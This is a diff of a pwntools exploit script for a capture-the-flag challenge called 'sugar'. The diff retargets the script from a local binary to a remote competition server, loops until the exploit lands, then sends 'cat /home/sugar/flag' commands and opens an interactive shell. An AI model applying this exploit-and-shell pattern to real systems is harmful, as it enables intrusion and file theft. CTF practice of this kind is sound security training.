@@ -5,10 +5,14 @@ from pwn import *
 context.arch = 'amd64'
 context.terminal = ['tmux', 'splitw', '-h']
 
+# python3 sugar.py SILENT=1
 flag = False
+cnt = 0
 while not flag :
-    r = process('./test')
-
+    # r = process('./sugar')
+    r = remote('chals1.eof.ais3.org', 45124)
+    print(cnt)
+    cnt += 1
     r.sendline(str(0x21000))
     r.sendline('+')
 
@@ -25,6 +29,10 @@ while not flag :
         if b'stack' in data or b'glibc' in data or b'free' in data:
             r.close()
             continue
+        r.sendline('cat /home/sugar/flag')
+        r.sendline('cat /home/sugar/flag')
+        r.sendline('cat /home/sugar/flag')
+        print(r.recv())
         r.interactive()
         flag = True
     except:
